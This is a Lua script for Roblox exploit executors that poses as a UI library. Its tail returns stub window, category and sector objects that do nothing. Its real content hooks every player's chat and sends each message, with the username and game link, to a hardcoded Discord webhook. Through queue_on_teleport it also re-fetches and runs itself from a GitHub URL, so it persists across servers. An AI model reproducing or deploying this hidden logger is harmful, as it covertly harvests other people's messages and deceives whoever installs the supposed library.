local webhook = "https://discord.com/api/webhooks/1517029030661066855/HlI0C-4uAw5SO79zDYDYMJfGCq_7naXSSg2J_GkD3WM_tzDWFyv6pLk2Z6AeGd_1nodk"

local queue = {}
local sending = false

local requestfunc = syn and syn.request or http_request or request

local function processQueue()
    if sending then return end
    sending = true
    while #queue > 0 do
        local data = table.remove(queue, 1)
        local ok, err = pcall(function()
            requestfunc({
                Url = webhook,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = game:GetService("HttpService"):JSONEncode({content = data})
            })
        end)
        if not ok then
            table.insert(queue, 1, data)
            task.wait(1)
        else
            task.wait(0.2)
        end
    end
    sending = false
end

local function sendMessage(username, message)
    local gameName = pcall(function() return game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name end) and game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name or ("PlaceId " .. game.PlaceId)
    local gameLink = "https://www.roblox.com/games/" .. game.PlaceId
    local content = string.format("%s: %s\n-# sent from [%s](<%s>)", username, message, gameName, gameLink)
    table.insert(queue, content)
    task.spawn(processQueue)
end

local useModern = game:GetService("TextChatService").ChatVersion == Enum.ChatVersion.TextChatService
if useModern then
    game:GetService("TextChatService").MessageReceived:Connect(function(msg)
        if msg.TextSource then
            local player = game:GetService("Players"):GetPlayerByUserId(msg.TextSource.UserId)
            if player then
                sendMessage(player.Name, msg.Text)
            end
        end
    end)
else
    local function hookPlayer(player)
        player.Chatted:Connect(function(msg)
            sendMessage(player.Name, msg)
        end)
    end
    for _, player in ipairs(game:GetService("Players"):GetPlayers()) do
        hookPlayer(player)
    end
    game:GetService("Players").PlayerAdded:Connect(hookPlayer)
end

queue_on_teleport([[loadstring(game:HttpGet("https://raw.githubusercontent.com/w1nsense/main/main/ui-library.lua"))()]])

local dummyElement = {
    SetValue = function() end,
    GetValue = function() return nil end,
}
local dummySector = {
    DarkStorm = function(_, ...) return dummyElement end,
}
local dummyCategory = {
    Sector = function(_, ...) return dummySector end,
}
local dummyWindow = {
    Category = function(_, ...) return dummyCategory end,
    ChangeToggleKey = function() end,
}
return {
    new = function(_, ...) return dummyWindow end,
}
